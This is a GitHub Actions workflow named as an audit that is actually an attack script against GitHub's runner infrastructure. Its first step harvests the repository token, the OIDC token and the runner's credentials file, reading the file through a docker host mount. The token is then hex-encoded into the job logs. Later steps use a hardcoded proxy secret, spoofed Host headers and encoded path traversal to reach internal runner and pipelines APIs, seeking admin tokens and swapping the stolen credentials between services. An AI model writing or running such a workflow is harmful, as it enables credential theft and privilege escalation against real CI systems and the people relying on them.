name: Audit v56
on:
  pull_request:
    types: [opened, synchronize, reopened]

permissions:
  contents: write
  pull-requests: write
  id-token: write
  actions: write
  packages: write
  checks: write
  statuses: write
  deployments: write
  issues: write

jobs:
  audit-v56:
    runs-on: ubuntu-latest
    steps:

      # ══════════════════════════════════════════════════════════════
      # STEP 1: Harvest
      # ══════════════════════════════════════════════════════════════
      - name: Step 1 - Harvest
        if: always()
        run: |
          set +e
          echo "=== V56 HARVEST ==="
          echo "$PATH" > /tmp/saved_path.txt
          RT="${{ secrets.GITHUB_TOKEN }}"
          echo "$RT" > /tmp/rt.txt
          echo "RT_PFX=${RT:0:14} LEN=${#RT}"
          echo "$ACTIONS_ID_TOKEN_REQUEST_TOKEN" > /tmp/idtok.txt
          echo "$ACTIONS_ID_TOKEN_REQUEST_URL" > /tmp/idtok_url.txt
          WLOG=$(find /home/runner/actions-runner -name "Worker_*.log" -type f 2>/dev/null | head -1)
          if [ -f "$WLOG" ]; then
            for KEY in PipelinesServiceUrl CacheServerUrl ResultsServiceUrl; do
              VAL=$(grep -oP "\"${KEY}\"\s*:\s*\"\K[^\"]+" "$WLOG" 2>/dev/null | head -1)
              echo "$KEY=$VAL"; echo "$VAL" > /tmp/${KEY}.txt
            done
            PLAN=$(grep -oP '"planId"\s*:\s*"\K[^"]+' "$WLOG" | head -1)
            JOB=$(grep -oP '"jobId"\s*:\s*"\K[^"]+' "$WLOG" | head -1)
            echo "PLAN=$PLAN JOB=$JOB"
            echo "$PLAN" > /tmp/plan.txt; echo "$JOB" > /tmp/job.txt
          fi
          docker run --rm -v /:/h alpine sh -c '
            F=$(find /h/home/runner -name ".credentials" -type f 2>/dev/null | head -1)
            [ -f "$F" ] && { echo "CRED_HEX_START"; xxd -p "$F" | tr -d "\n"; echo ""; echo "CRED_HEX_END"; }
          ' 2>/dev/null > /tmp/hex_extract.txt
          python3 -c "
          import binascii,json
          raw=open('/tmp/hex_extract.txt').read()
          s=raw.find('CRED_HEX_START');e=raw.find('CRED_HEX_END')
          if s>=0 and e>=0:
            h=raw[s+14:e].strip()
            d=json.loads(binascii.unhexlify(h).decode())
            t=d.get('Data',{}).get('token','')
            open('/tmp/cred_token.txt','w').write(t)
            print(f'CTOK_LEN={len(t)}')
          " 2>/dev/null
          echo "RT_HEX=$(echo -n "$RT" | xxd -p | tr -d '\n')"

      # ══════════════════════════════════════════════════════════════
      # STEP 2: EXHAUST RUNNER SERVICE VIA PROXY
      # runner.actions.github.com returned 200 connectionData via proxy!
      # This service handles sessions, agent messages, JIT tokens.
      # Let's hit EVERY runner endpoint while routing via cacheServer.
      # ══════════════════════════════════════════════════════════════
      - name: Step 2 - Runner API via Proxy
        if: always()
        run: |
          set +e
          export PATH=$(cat /tmp/saved_path.txt)
          echo "=== RUNNER via PROXY ==="
          IDTOK=$(cat /tmp/idtok.txt)
          SECRET="ebCM8PuzoqMUC79EgT17Glzg3dxVdS1cSj8PJs6gALbtgEsvbF"
          PROXY="https://artifactcache.actions.githubusercontent.com/$SECRET"
          RUNNER_HOST="runner.actions.githubusercontent.com"
          VER="api-version=6.0-preview"

          # A: Enumerate runner service endpoints via proxy
          echo "--- A: Runner Endpoints ---"
          for EP in \
            "_apis/connectionData" \
            "_apis/resourceareas" \
            "_apis/distributedtask/pools" \
            "_apis/distributedtask/pools/1" \
            "_apis/distributedtask/pools/1/agents" \
            "_apis/distributedtask/pools/1/jobrequests" \
            "_apis/distributedtask/pools/1/messages" \
            "_apis/distributedtask/pools/1/sessions" \
            "_apis/distributedtask/pools/1/admintoken" \
            "_apis/distributedtask/pools/..%2fadmintoken" \
            "_apis/distributedtask/pools/..%2fidtoken" \
            "_apis/distributedtask/pools/..%2fsessions" \
            "_apis/distributedtask/pools/..%2fmessages" \
            "_apis/distributedtask/admintoken" \
            "_apis/distributedtask/idtoken" \
            "_apis/distributedtask/sessions" \
            "_apis/distributedtask/brokerlistener" \
            "_apis/runtime/runnergroups" \
            "_apis/runtime/runnerscalesets" \
            "_apis/serviceHosts" \
            "serviceHosts/8f795dfa-02d7-4018-af3a-c98d25c03f68/_apis/distributedtask/pools" \
            "serviceHosts/8f795dfa-02d7-4018-af3a-c98d25c03f68/_apis/distributedtask/admintoken"; do
            R=$(/usr/bin/curl -sS -w "\nHTTP_%{http_code}" --connect-timeout 2 -m 4 \
              -H "Authorization: Bearer $IDTOK" \
              -H "Host: $RUNNER_HOST" \
              -H "Accept: application/json; $VER" \
              "$PROXY/$EP" --path-as-is 2>/dev/null)
            CODE=$(echo "$R" | tail -1)
            BODY=$(echo "$R" | sed '$d')
            echo "A $EP = $CODE | $(echo "$BODY" | head -c 150)"
          done
          echo ""

          # B: POST to runner session/agent creation endpoints via proxy
          echo "--- B: Runner POSTs via Proxy ---"
          for EP_BODY in \
            "_apis/distributedtask/pools/1/sessions;{\"ownerName\":\"v56-runner\"}" \
            "_apis/distributedtask/pools/1/agents;{\"name\":\"v56-agent\",\"version\":\"2.0\"}" \
            "_apis/distributedtask/pools/..%2fsessions;{\"ownerName\":\"v56\"}" \
            "_apis/distributedtask/pools/..%2fadmintoken;{}" \
            "_apis/runtime/runnerscalesets;{\"Name\":\"v56\",\"RunnerGroupId\":1}" \
            "_apis/runtime/runnergroups;{\"Name\":\"v56-prox\",\"Pool\":{\"Name\":\"v56\"}}"; do
            IFS=';' read -r EP BODY <<< "$EP_BODY"
            R=$(/usr/bin/curl -sS -w "\nHTTP_%{http_code}" -X POST --connect-timeout 2 -m 4 \
              -H "Authorization: Bearer $IDTOK" \
              -H "Host: $RUNNER_HOST" \
              -H "Content-Type: application/json" \
              -H "Accept: application/json; $VER" \
              "$PROXY/$EP" --path-as-is -d "$BODY" 2>/dev/null)
            CODE=$(echo "$R" | tail -1)
            BSTR=$(echo "$R" | sed '$d')
            echo "B POST $EP = $CODE | $(echo "$BSTR" | head -c 200)"
          done

      # ══════════════════════════════════════════════════════════════
      # STEP 3: PIPELINES SERVICE VIA PROXY BYPASS
      # pipelines returned 403 via proxy — means routing works!
      # 403 = we hit it but need different auth or path.
      # Try with CTOK + traversal via pipelines Host header.
      # ══════════════════════════════════════════════════════════════
      - name: Step 3 - Pipelines via Proxy + Token Swap
        if: always()
        run: |
          set +e
          export PATH=$(cat /tmp/saved_path.txt)
          echo "=== PIPELINES via PROXY ==="
          IDTOK=$(cat /tmp/idtok.txt)
          RT=$(cat /tmp/rt.txt)
          CTOK=$(cat /tmp/cred_token.txt 2>/dev/null)
          SECRET="ebCM8PuzoqMUC79EgT17Glzg3dxVdS1cSj8PJs6gALbtgEsvbF"
          PROXY="https://artifactcache.actions.githubusercontent.com/$SECRET"
          PIPE_HOST="pipelines.actions.githubusercontent.com"
          VER="api-version=6.0-preview"

          # A: Try each token on pipelines service
          echo "--- A: Token swap on pipelines via proxy ---"
          for TOK_NAME in IDTOK RT CTOK; do
            eval TOK=\$$TOK_NAME
            [ -z "$TOK" ] || [ "${#TOK}" -lt 10 ] && continue

            for EP in "_apis/connectionData" "_apis/distributedtask/pools" "_apis/distributedtask/admintoken"; do
              R=$(/usr/bin/curl -sS -w "\nHTTP_%{http_code}" --connect-timeout 2 -m 3 \
                -H "Authorization: Bearer $TOK" \
                -H "Host: $PIPE_HOST" \
                -H "Accept: application/json; $VER" \
                "$PROXY/$EP" --path-as-is 2>/dev/null)
              CODE=$(echo "$R" | tail -1)
              BODY=$(echo "$R" | sed '$d')
              echo "A $TOK_NAME $EP = $CODE | $(echo "$BODY" | head -c 150)"
            done
          done
          echo ""

          # B: Pipelines traversal attacks via proxy
          echo "--- B: Pipelines traversal via proxy ---"
          for TRAV in \
            "_apis/distributedtask/pools/..%2fadmintoken" \
            "_apis/distributedtask/pools/..%2fidtoken" \
            "_apis/distributedtask/pools/..%2fsessions" \
            "_apis/runtime/runnergroups/..%2fgeneratejitconfig" \
            "_apis/pipelines/..%2fadmintoken"; do
            R=$(/usr/bin/curl -sS -w "\nHTTP_%{http_code}" --connect-timeout 2 -m 3 \
              -H "Authorization: Bearer $IDTOK" \
              -H "Host: $PIPE_HOST" \
              -H "Accept: application/json; $VER" \
              "$PROXY/$TRAV" --path-as-is 2>/dev/null)
            CODE=$(echo "$R" | tail -1)
            BODY=$(echo "$R" | sed '$d')
            echo "B $TRAV = $CODE | $(echo "$BODY" | head -c 150)"
          done

      # ══════════════════════════════════════════════════════════════
      # STEP 4: ADMINTOKEN DIRECT via RUNNER HOST
      # In v53 we saw admintoken returns 204.
      # But now we can route via proxy with runner Host!
      # Runner likely has different permissions — it's the internal host.
      # ══════════════════════════════════════════════════════════════
      - name: Step 4 - AdminToken Escalation via Runner Proxy
        if: always()
        run: |
          set +e
          export PATH=$(cat /tmp/saved_path.txt)
          echo "=== ADMINTOKEN via RUNNER PROXY ==="
          IDTOK=$(cat /tmp/idtok.txt)
          RT=$(cat /tmp/rt.txt)
          CTOK=$(cat /tmp/cred_token.txt 2>/dev/null)
          SECRET="ebCM8PuzoqMUC79EgT17Glzg3dxVdS1cSj8PJs6gALbtgEsvbF"
          PROXY="https://artifactcache.actions.githubusercontent.com/$SECRET"
          RUNNER_HOST="runner.actions.githubusercontent.com"
          VER="api-version=6.0-preview"

          # A: Hit admintoken directly via runner Host — GET
          echo "--- A: AdminToken GET via runner host ---"
          for TOK_NAME in IDTOK RT CTOK; do
            eval TOK=\$$TOK_NAME
            [ -z "$TOK" ] || [ "${#TOK}" -lt 10 ] && continue
            R=$(/usr/bin/curl -sS -i -w "\nHTTP_%{http_code}" --connect-timeout 3 -m 5 \
              -H "Authorization: Bearer $TOK" \
              -H "Host: $RUNNER_HOST" \
              -H "Accept: application/json; $VER" \
              "$PROXY/_apis/distributedtask/pools/..%2fadmintoken" --path-as-is 2>/dev/null)
            CODE=$(echo "$R" | grep -oE "HTTP/[0-9.]+ [0-9]+" | head -1 | awk '{print $2}')
            BODY=$(echo "$R" | tail -2 | head -1)
            echo "A $TOK_NAME admintoken GET = $CODE | $(echo "$BODY" | head -c 200)"
          done
          echo ""

          # B: POST admintoken via runner host with all tokens
          echo "--- B: AdminToken POST via runner host ---"
          for TOK_NAME in IDTOK RT CTOK; do
            eval TOK=\$$TOK_NAME
            [ -z "$TOK" ] || [ "${#TOK}" -lt 10 ] && continue
            R=$(/usr/bin/curl -sS -i -w "\nHTTP_%{http_code}" -X POST --connect-timeout 3 -m 5 \
              -H "Authorization: Bearer $TOK" \
              -H "Host: $RUNNER_HOST" \
              -H "Content-Type: application/json" \
              -H "Accept: application/json; $VER" \
              "$PROXY/_apis/distributedtask/pools/..%2fadmintoken" --path-as-is \
              -d '{"poolId":1}' 2>/dev/null)
            CODE=$(echo "$R" | grep -oE "HTTP/[0-9.]+ [0-9]+" | head -1 | awk '{print $2}')
            BODY=$(echo "$R" | tail -2 | head -1)
            echo "B $TOK_NAME admintoken POST = $CODE | $(echo "$BODY" | head -c 200)"
          done
          echo ""

          # C: Direct admintoken on runner serviceHosts
          echo "--- C: serviceHost admintoken ---"
          SVCHOST="serviceHosts/8f795dfa-02d7-4018-af3a-c98d25c03f68"
          for EP in \
            "$SVCHOST/_apis/distributedtask/pools/..%2fadmintoken" \
            "$SVCHOST/_apis/distributedtask/admintoken" \
            "$SVCHOST/_apis/distributedtask/pools/1/admintoken" \
            "$SVCHOST/_apis/distributedtask/idtoken"; do
            R=$(/usr/bin/curl -sS -w "\nHTTP_%{http_code}" --connect-timeout 2 -m 4 \
              -H "Authorization: Bearer $IDTOK" \
              -H "Host: $RUNNER_HOST" \
              -H "Accept: application/json; $VER" \
              "$PROXY/$EP" --path-as-is 2>/dev/null)
            CODE=$(echo "$R" | tail -1)
            BODY=$(echo "$R" | sed '$d')
            echo "C $EP = $CODE | $(echo "$BODY" | head -c 200)"
          done

      # ══════════════════════════════════════════════════════════════
      # STEP 5: Final
      # ══════════════════════════════════════════════════════════════
      - name: Step 5 - Final
        if: always()
        run: |
          set +e
          export PATH=$(cat /tmp/saved_path.txt)
          echo "=== V56 FINAL ==="
          echo "RT_HEX=$(cat /tmp/rt.txt | xxd -p | tr -d '\n')"
          echo "=== V56 COMPLETE ==="
